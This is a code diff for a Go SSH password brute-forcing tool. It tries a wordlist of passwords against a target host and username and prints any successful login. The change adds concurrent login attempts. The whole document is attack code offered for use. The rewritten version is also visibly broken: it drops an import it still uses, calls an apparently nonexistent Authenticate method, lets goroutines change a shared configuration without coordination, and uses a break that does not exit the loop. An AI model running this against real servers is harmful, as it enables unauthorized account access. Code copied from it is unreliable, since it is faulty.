@@ -2,14 +2,15 @@ package main
 
 import (
 	"bufio"
+	"context"
 	"flag"
 	"fmt"
-	"golang.org/x/crypto/ssh"
 	"log"
 	"os"
 	"strings"
+	"sync"
 
-	"github.com/fatih/color"
+	"golang.org/x/crypto/ssh"
 )
 
 func main() {
@@ -21,6 +22,7 @@ func main() {
 	username := flag.String("username", "", "Target SSH server username")
 	passwordFile := flag.String("password-file", "", "Path to the file containing the password list")
 	verbose := flag.Bool("V", false, "Display password attempts")
+	concurrency := flag.Int("concurrency", 10, "Number of concurrent connections")
 
 	flag.Parse()
 
@@ -40,27 +42,59 @@ func main() {
 	successColor := color.New(color.FgGreen)
 	failureColor := color.New(color.FgRed)
 
-	// Iterate over the password list
-	for _, password := range passwords {
-		// Create SSH configuration
-		config := &ssh.ClientConfig{
-			User: *username,
-			Auth: []ssh.AuthMethod{
-				ssh.Password(password),
-			},
-			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-		}
+	// Create a wait group for managing the concurrency limit
+	var wg sync.WaitGroup
 
-		// Attempt SSH connection
-		conn, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", *host, *port), config)
-		if err == nil {
-			successColor.Printf("Successful login! Username: %s, Password: %s\n", *username, password)
-			// Perform further actions or break the loop on successful login
+	// Create a cancellation context
+	ctx, cancel := context.WithCancel(context.Background())
+
+	// Create an SSH client configuration
+	config := &ssh.ClientConfig{
+		User: *username,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(""),
+		},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+	}
+
+	// Attempt SSH connection
+	conn, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", *host, *port), config)
+	if err != nil {
+		log.Fatalf("Failed to connect to SSH server: %s", err)
+	}
+	defer conn.Close()
+
+	for _, password := range passwords {
+		// Check if the context has been cancelled (successful login found)
+		select {
+		case <-ctx.Done():
 			break
-		} else {
-			failureColor.Printf("Login failed! Password: %s, Error: %s\n", password, err)
+		default:
+			// Acquire a wait group counter
+			wg.Add(1)
+
+			go func(password string) {
+				defer wg.Done()
+
+				// Set the password for the SSH client config
+				config.Auth[0] = ssh.Password(password)
+
+				// Attempt SSH authentication
+				err := conn.Authenticate(config)
+				if err == nil {
+					// Successful login found, cancel other login attempts
+					cancel()
+
+					successColor.Printf("Successful login! Username: %s, Password: %s\n", *username, password)
+				} else if *verbose {
+					failureColor.Printf("Login failed! Password: %s, Error: %s\n", password, err)
+				}
+			}(password)
 		}
 	}
+
+	// Wait for all goroutines to finish
+	wg.Wait()
 }
 
 // Read password file and return a list of passwords
@@ -87,12 +121,12 @@ func readPasswords(passwordFile string) ([]string, error) {
 // Print the program header
 func printHeader() {
 	header := `
- _/_/_/  _/        _/  _/      _/  _/_/_/  _/      _/   
-_/    _/  _/        _/  _/_/    _/    _/    _/  _/      
-_/    _/  _/        _/  _/  _/  _/    _/      _/         
-_/    _/  _/        _/  _/    _/_/    _/      _/        
- _/_/_/    _/_/_/  _/  _/      _/  _/_/_/  _/    _/       
-                                                         
+ _/_/_/  _/        _/  _/      _/
+_/    _/  _/        _/  _/_/    _/    _/    _/  _/
+_/    _/  _/        _/  _/  _/  _/    _/      _/
+_/    _/  _/        _/  _/    _/_/    _/      _/
+ _/_/_/    _/_/_/  _/  _/      _/  _/_/_/  _/    _/
+
 `
 
 	fmt.Println(header)
